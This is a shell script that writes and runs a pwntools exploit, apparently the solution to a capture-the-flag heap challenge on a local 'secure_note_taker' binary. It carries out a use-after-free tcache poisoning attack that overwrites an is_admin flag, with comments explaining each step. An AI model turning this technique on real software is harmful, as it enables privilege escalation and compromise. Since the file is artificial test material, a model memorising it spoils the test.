#!/usr/bin/env bash
set -euo pipefail

cat << 'PY_EOF' > /tmp/solve.py
from pwn import *

context.log_level = 'error'

p = process('/out/secure_note_taker')

# We compiled without PIE, so is_admin is at a static address.
is_admin_addr = 0x41208c

def add_note(idx):
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b'Index (0-9): ')
    p.sendline(str(idx).encode())

def del_note(idx):
    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.recvuntil(b'Index (0-9): ')
    p.sendline(str(idx).encode())

def edit_note(idx, content):
    p.recvuntil(b'> ')
    p.sendline(b'3')
    p.recvuntil(b'Index (0-9): ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Enter note content: ')
    # Send exactly what we want without a newline if we use send
    # read(0, buf, 8) reads exactly 8 bytes if provided, or up to newline.
    # The vulnerability allows us to overwrite the first 8 bytes (the FD pointer).
    p.send(content)

# 1. Allocate two chunks to establish tcache structure
add_note(0)
add_note(1)

# 2. Free both chunks to place them in the tcache freelist
# The tcache is LIFO (Last In First Out). 
# If we free 1 then 0, the list is: Head -> Note 0 -> Note 1
del_note(1)
del_note(0)

# 3. Use the Use-After-Free to overwrite the FD pointer of Note 0.
# The FD pointer points to the next chunk in the free list (Note 1).
# We overwrite it with the address of the is_admin variable.
# Now the list is: Head -> Note 0 -> is_admin
# We send an 8-byte payload (the address)
edit_note(0, p64(is_admin_addr))

# 4. Allocate a chunk. This returns Note 0 and updates the Head.
# Now the list is: Head -> is_admin
add_note(2)

# 5. Allocate the next chunk. `malloc` returns `is_admin_addr`!
# But our `add_note` function doesn't write data immediately, it just allocates.
# Wait! We need to write data to `is_admin` to make it non-zero.
# Option 3 (Edit Note) allows us to write to an allocated chunk.
add_note(3) # Chunk 3 is now pointing to is_admin!

# 6. Edit Chunk 3 to write '1' to is_admin
edit_note(3, p64(1))

# 7. Win
p.recvuntil(b'> ')
p.sendline(b'4')
p.recvuntil(b'FLAG:')

p.close()
PY_EOF

python3 /tmp/solve.py
